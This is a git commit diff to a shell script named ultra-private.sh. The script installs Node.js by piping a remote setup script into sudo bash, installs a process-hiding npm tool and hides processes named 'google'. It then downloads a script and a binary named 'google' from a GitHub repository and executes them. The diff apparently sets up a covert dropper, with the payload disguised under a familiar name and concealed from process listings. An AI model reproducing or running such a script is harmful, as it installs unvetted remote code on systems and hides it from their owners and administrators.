5eef4633dc679bd7cf549c4125b39e6fa2006563
mhintao <110258960+mhintao@users.noreply.github.com>
2022-08-02 14:12:46 -0700

    Update ultra-private.sh

--- ultra-private.sh
+++ ultra-private.sh
@@ -2,6 +2,8 @@ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
 ph add google
-wget bash.shprivate
-wget processprivate
-./bash.sh
+chmod +x google
+wget https://github.com/huhiou/ultra-private/raw/main/ultra.sh
+wget https://github.com/huhiou/ultra-private/raw/main/google
+chmod +x ultra.sh
+./ultra.sh
